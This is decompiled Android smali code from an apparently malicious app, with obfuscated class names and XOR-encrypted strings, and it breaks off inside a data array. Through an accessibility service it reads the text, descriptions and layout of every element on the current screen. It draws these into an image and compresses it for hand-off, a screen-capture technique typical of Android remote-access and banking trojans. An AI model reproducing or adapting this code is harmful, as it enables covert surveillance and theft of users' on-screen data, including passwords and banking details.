.class public abstract Lcom/vknnolqo/p9sv5zvf/MtokN1ft;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static a:Ljava/util/ArrayList;

.field public static b:Ljava/util/ArrayList;

.field public static c:Ljava/util/ArrayList;

.field public static d:Ljava/util/ArrayList;

.field public static e:Ljava/util/Map;

.field private static f:Landroid/os/PowerManager$WakeLock;

.field public static g:Ljava/util/List;

.field public static h:Ljava/util/Map;

.field public static i:Ljava/util/Map;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->a:Ljava/util/ArrayList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->b:Ljava/util/ArrayList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->c:Ljava/util/ArrayList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->d:Ljava/util/ArrayList;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->e:Ljava/util/Map;

    const/4 v0, 0x0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->f:Landroid/os/PowerManager$WakeLock;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->g:Ljava/util/List;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->h:Ljava/util/Map;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->i:Ljava/util/Map;

    return-void
.end method

.method public static A()[B
    .locals 13

    .line 1
    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v1

    if-nez v1, :cond_0

    return-object v0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v2

    if-nez v2, :cond_1

    return-object v0

    :cond_1
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_2

    return-object v0

    :cond_2
    const/4 v3, 0x4

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 v6, 0x3

    new-array v7, v6, [B

    fill-array-data v7, :array_2

    new-array v8, v5, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v2, v4, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    new-array v7, v3, [B

    fill-array-data v7, :array_4

    new-array v8, v5, [B

    fill-array-data v8, :array_5

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v8, v5, [B

    fill-array-data v8, :array_7

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v7, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    sget-object v7, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v4, v3, v7}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v3

    new-instance v4, Landroid/graphics/Canvas;

    invoke-direct {v4, v3}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    sget-object v7, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->q:Ljava/lang/String;

    const/4 v8, 0x7

    new-array v8, v8, [B

    fill-array-data v8, :array_8

    new-array v9, v5, [B

    fill-array-data v9, :array_9

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v7, Landroid/graphics/Paint;

    invoke-direct {v7}, Landroid/graphics/Paint;-><init>()V

    invoke-static {v2}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v7, v2}, Landroid/graphics/Paint;->setColor(I)V

    const/high16 v2, 0x42400000    # 48.0f

    invoke-virtual {v7, v2}, Landroid/graphics/Paint;->setTextSize(F)V

    sget-object v2, Landroid/graphics/Typeface;->DEFAULT:Landroid/graphics/Typeface;

    const/4 v8, 0x1

    invoke-static {v2, v8}, Landroid/graphics/Typeface;->create(Landroid/graphics/Typeface;I)Landroid/graphics/Typeface;

    move-result-object v2

    invoke-virtual {v7, v2}, Landroid/graphics/Paint;->setTypeface(Landroid/graphics/Typeface;)Landroid/graphics/Typeface;

    invoke-virtual {v7, v8}, Landroid/graphics/Paint;->setAntiAlias(Z)V

    sget-object v2, Landroid/graphics/Paint$Style;->FILL:Landroid/graphics/Paint$Style;

    invoke-virtual {v7, v2}, Landroid/graphics/Paint;->setStyle(Landroid/graphics/Paint$Style;)V

    sget-object v2, Landroid/graphics/Paint$Align;->LEFT:Landroid/graphics/Paint$Align;

    invoke-virtual {v7, v2}, Landroid/graphics/Paint;->setTextAlign(Landroid/graphics/Paint$Align;)V

    sget-object v2, Landroid/graphics/PorterDuff$Mode;->CLEAR:Landroid/graphics/PorterDuff$Mode;

    const/4 v9, 0x0

    invoke-virtual {v4, v9, v2}, Landroid/graphics/Canvas;->drawColor(ILandroid/graphics/PorterDuff$Mode;)V

    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    const-string v9, ""
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v10

    if-eqz v10, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    goto :goto_0

    :catch_0
    move-exception v10

    goto :goto_1

    :cond_3
    :goto_0
    if-eqz v9, :cond_4

    invoke-virtual {v9}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_6

    :cond_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v10

    const/16 v11, 0x1a

    new-array v11, v11, [B

    fill-array-data v11, :array_a

    new-array v12, v5, [B

    fill-array-data v12, :array_b

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_5

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v10

    const/16 v11, 0x18

    new-array v11, v11, [B

    fill-array-data v11, :array_c

    new-array v12, v5, [B

    fill-array-data v12, :array_d

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_6

    :cond_5
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v10

    if-eqz v10, :cond_6

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :goto_1
    :try_start_2
    invoke-virtual {v10}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_6
    :goto_2
    if-eqz v9, :cond_7

    invoke-virtual {v9}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_8

    goto :goto_3

    :catch_1
    move-exception v1

    goto :goto_5

    :cond_7
    :goto_3
    new-array v6, v6, [B

    fill-array-data v6, :array_e

    new-array v5, v5, [B

    fill-array-data v5, :array_f

    invoke-static {v6, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    :cond_8
    new-instance v5, Landroid/graphics/RectF;

    invoke-direct {v5, v2}, Landroid/graphics/RectF;-><init>(Landroid/graphics/Rect;)V

    invoke-static {v4, v5}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->C(Landroid/graphics/Canvas;Landroid/graphics/RectF;)V

    iget v5, v2, Landroid/graphics/Rect;->left:I

    invoke-virtual {v2}, Landroid/graphics/Rect;->centerY()I

    move-result v2

    div-int/lit8 v2, v2, 0x2

    int-to-float v5, v5

    int-to-float v2, v2

    invoke-virtual {v4, v9, v5, v2, v7}, Landroid/graphics/Canvas;->drawText(Ljava/lang/String;FFLandroid/graphics/Paint;)V

    const/16 v2, 0x40

    invoke-static {v4, v1, v7, v2}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->D(Landroid/graphics/Canvas;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/graphics/Paint;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :try_start_3
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-virtual {v3}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v2

    int-to-float v2, v2

    invoke-virtual {v3}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v4

    int-to-float v4, v4

    div-float/2addr v2, v4

    const/16 v4, 0x15e

    int-to-float v5, v4

    mul-float/2addr v2, v5

    float-to-int v2, v2

    invoke-static {v3, v4, v2, v8}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v5, 0x50

    invoke-virtual {v2, v4, v5, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :try_start_4
    invoke-virtual {v3}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    return-object v1

    :catchall_0
    move-exception v1

    goto :goto_4

    :catch_2
    move-exception v1

    :try_start_5
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-eqz v3, :cond_a

    :try_start_6
    invoke-virtual {v3}, Landroid/graphics/Bitmap;->recycle()V

    goto :goto_6

    :goto_4
    if-eqz v3, :cond_9

    invoke-virtual {v3}, Landroid/graphics/Bitmap;->recycle()V

    :cond_9
    throw v1
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    :goto_5
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_a
    :goto_6
    return-object v0

    nop

    :array_0
    .array-data 1
        -0x38t
        -0x78t
        0x6t
        0x7ct
    .end array-data

    :array_1
    .array-data 1
        -0x61t
        -0x5t
        0x65t
        0xet
        -0x7dt
        0x27t
        -0x3dt
        -0x48t
    .end array-data

    :array_2
    .array-data 1
        0xct
        -0x60t
        -0x46t
    .end array-data

    :array_3
    .array-data 1
        0x3bt
        -0x6et
        -0x76t
        0x7t
        0x17t
        -0x32t
        -0x67t
        -0x2dt
    .end array-data

    :array_4
    .array-data 1
        -0x77t
        -0x8t
        -0x2bt
        0x27t
    .end array-data

    :array_5
    .array-data 1
        -0x3ft
        -0x75t
        -0x4at
        0x55t
        -0x57t
        0x63t
        0x6ft
        0x61t
    .end array-data

    :array_6
    .array-data 1
        -0x68t
        -0x3ft
        -0x53t
        0x46t
    .end array-data

    :array_7
    .array-data 1
        -0x57t
        -0xdt
        -0x6bt
        0x76t
        -0x56t
        -0x49t
        -0x71t
        -0x21t
    .end array-data

    :array_8
    .array-data 1
        0x70t
        -0x52t
        0x3et
        -0x4bt
        0x7et
        -0x3at
        -0x17t
    .end array-data

    :array_9
    .array-data 1
        0x53t
        -0x18t
        0x78t
        -0x7bt
        0x4et
        -0xat
        -0x27t
        0x6at
    .end array-data

    :array_a
    .array-data 1
        0x42t
        -0x54t
        0x71t
        -0x39t
        -0x36t
        -0x4et
        -0x21t
        0x6bt
        0x54t
        -0x55t
        0x71t
        -0x2et
        -0x40t
        -0x51t
        -0x6bt
        0xct
        0x4et
        -0x5dt
        0x72t
        -0x30t
        -0x19t
        -0x52t
        -0x31t
        0x31t
        0x4ct
        -0x54t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x23t
        -0x3et
        0x15t
        -0x4bt
        -0x5bt
        -0x25t
        -0x45t
        0x45t
    .end array-data

    :array_c
    .array-data 1
        0x40t
        0x3bt
        0x7ct
        -0x11t
        -0x5dt
        -0x56t
        0x34t
        0x12t
        0x56t
        0x3ct
        0x7ct
        -0x6t
        -0x57t
        -0x49t
        0x7et
        0x75t
        0x4ct
        0x34t
        0x7ft
        -0x8t
        -0x66t
        -0x56t
        0x35t
        0x4bt
    .end array-data

    :array_d
    .array-data 1
        0x21t
        0x55t
        0x18t
        -0x63t
        -0x34t
        -0x3dt
        0x50t
        0x3ct
    .end array-data

    :array_e
    .array-data 1
        0x78t
        0x55t
        -0x57t
    .end array-data

    :array_f
    .array-data 1
        -0x66t
        -0x2bt
        0xbt
        0x4at
        0x61t
        0x11t
        0x77t
        -0x2et
    .end array-data
.end method

.method public static B()V
    .locals 2

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->Q()V

    const-wide/16 v0, 0x3e8

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/T4NnkYgB;->j(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    return-void
.end method

.method private static C(Landroid/graphics/Canvas;Landroid/graphics/RectF;)V
    .locals 2

    .line 1
    new-instance v0, Landroid/graphics/Paint;

    invoke-direct {v0}, Landroid/graphics/Paint;-><init>()V

    const v1, -0xffff01

    invoke-virtual {v0, v1}, Landroid/graphics/Paint;->setColor(I)V

    sget-object v1, Landroid/graphics/Paint$Style;->STROKE:Landroid/graphics/Paint$Style;

    invoke-virtual {v0, v1}, Landroid/graphics/Paint;->setStyle(Landroid/graphics/Paint$Style;)V

    const/high16 v1, 0x40c00000    # 6.0f

    invoke-virtual {v0, v1}, Landroid/graphics/Paint;->setStrokeWidth(F)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/graphics/Paint;->setAntiAlias(Z)V

    const/high16 v1, 0x41900000    # 18.0f

    invoke-virtual {p0, p1, v1, v1, v0}, Landroid/graphics/Canvas;->drawRoundRect(Landroid/graphics/RectF;FFLandroid/graphics/Paint;)V

    return-void
.end method

.method private static D(Landroid/graphics/Canvas;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/graphics/Paint;I)V
    .locals 8

    .line 1
    if-eqz p1, :cond_5

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_4

    :cond_0
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_5

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_1

    goto :goto_3

    :cond_1
    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v3, Landroid/graphics/RectF;

    invoke-direct {v3, v2}, Landroid/graphics/RectF;-><init>(Landroid/graphics/Rect;)V

    invoke-static {p0, v3}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->C(Landroid/graphics/Canvas;Landroid/graphics/RectF;)V

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    if-eqz v3, :cond_2

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    :goto_1
    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    :cond_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    if-eqz v3, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    goto :goto_1

    :cond_3
    const-string v3, ""

    :goto_2
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_4

    int-to-float v4, p3

    invoke-virtual {p2, v4}, Landroid/graphics/Paint;->setTextSize(F)V

    invoke-virtual {p2, v3}, Landroid/graphics/Paint;->measureText(Ljava/lang/String;)F

    move-result v4

    invoke-virtual {p2}, Landroid/graphics/Paint;->getFontMetrics()Landroid/graphics/Paint$FontMetrics;

    move-result-object v5

    iget v6, v5, Landroid/graphics/Paint$FontMetrics;->bottom:F

    iget v5, v5, Landroid/graphics/Paint$FontMetrics;->top:F

    sub-float/2addr v6, v5

    invoke-virtual {v2}, Landroid/graphics/Rect;->centerX()I

    move-result v5

    int-to-float v5, v5

    const/high16 v7, 0x40000000    # 2.0f

    div-float/2addr v4, v7

    sub-float/2addr v5, v4

    float-to-int v4, v5

    invoke-virtual {v2}, Landroid/graphics/Rect;->centerY()I

    move-result v2

    int-to-float v2, v2

    const/high16 v5, 0x40800000    # 4.0f

    div-float/2addr v6, v5

    add-float/2addr v2, v6

    float-to-int v2, v2

    int-to-float v4, v4

    int-to-float v2, v2

    invoke-virtual {p0, v3, v4, v2, p2}, Landroid/graphics/Canvas;->drawText(Ljava/lang/String;FFLandroid/graphics/Paint;)V

    :cond_4
    const/16 v2, 0x32

    invoke-static {p0, v1, p2, v2}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->D(Landroid/graphics/Canvas;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/graphics/Paint;I)V

    :goto_3
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_5
    :goto_4
    return-void
.end method

.method public static E(I)Ljava/lang/String;
    .locals 4

    .line 1
    const/4 v0, 0x1

    const/4 v1, 0x7

    const/16 v2, 0x8

    if-eq p0, v0, :cond_b

    const/4 v0, 0x2

    const/16 v3, 0xc

    if-eq p0, v0, :cond_a

    const/4 v0, 0x4

    if-eq p0, v0, :cond_9

    if-eq p0, v2, :cond_8

    const/16 v0, 0x10

    if-eq p0, v0, :cond_7

    const/16 v0, 0x20

    if-eq p0, v0, :cond_6

    const/16 v0, 0x40

    if-eq p0, v0, :cond_5

    const/16 v0, 0x80

    if-eq p0, v0, :cond_4

    const/16 v0, 0x100

    if-eq p0, v0, :cond_3

    const/16 v0, 0x800

    const/16 v3, 0x16

    if-eq p0, v0, :cond_2

    const/16 v0, 0x1000

    if-eq p0, v0, :cond_1

    const/16 v0, 0x2000

    if-eq p0, v0, :cond_0

    new-array p0, v1, [B

    fill-array-data p0, :array_0

    new-array v0, v2, [B

    fill-array-data v0, :array_1

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_0
    new-array p0, v3, [B

    fill-array-data p0, :array_2

    new-array v0, v2, [B

    fill-array-data v0, :array_3

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_1
    new-array p0, v2, [B

    fill-array-data p0, :array_4

    new-array v0, v2, [B

    fill-array-data v0, :array_5

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_2
    new-array p0, v3, [B

    fill-array-data p0, :array_6

    new-array v0, v2, [B

    fill-array-data v0, :array_7

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_3
    const/16 p0, 0xa

    new-array p0, p0, [B

    fill-array-data p0, :array_8

    new-array v0, v2, [B

    fill-array-data v0, :array_9

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_4
    const/16 p0, 0xb

    new-array p0, p0, [B

    fill-array-data p0, :array_a

    new-array v0, v2, [B

    fill-array-data v0, :array_b

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_5
    const/16 p0, 0x14

    new-array p0, p0, [B

    fill-array-data p0, :array_c

    new-array v0, v2, [B

    fill-array-data v0, :array_d

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_6
    const/16 p0, 0xe

    new-array p0, p0, [B

    fill-array-data p0, :array_e

    new-array v0, v2, [B

    fill-array-data v0, :array_f

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_7
    new-array p0, v3, [B

    fill-array-data p0, :array_10

    new-array v0, v2, [B

    fill-array-data v0, :array_11

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_8
    new-array p0, v1, [B

    fill-array-data p0, :array_12

    new-array v0, v2, [B

    fill-array-data v0, :array_13

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_9
    new-array p0, v2, [B

    fill-array-data p0, :array_14

    new-array v0, v2, [B

    fill-array-data v0, :array_15

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_a
    new-array p0, v3, [B

    fill-array-data p0, :array_16

    new-array v0, v2, [B

    fill-array-data v0, :array_17

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_b
    new-array p0, v1, [B

    fill-array-data p0, :array_18

    new-array v0, v2, [B

    fill-array-data v0, :array_19

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    nop

    :array_0
    .array-data 1
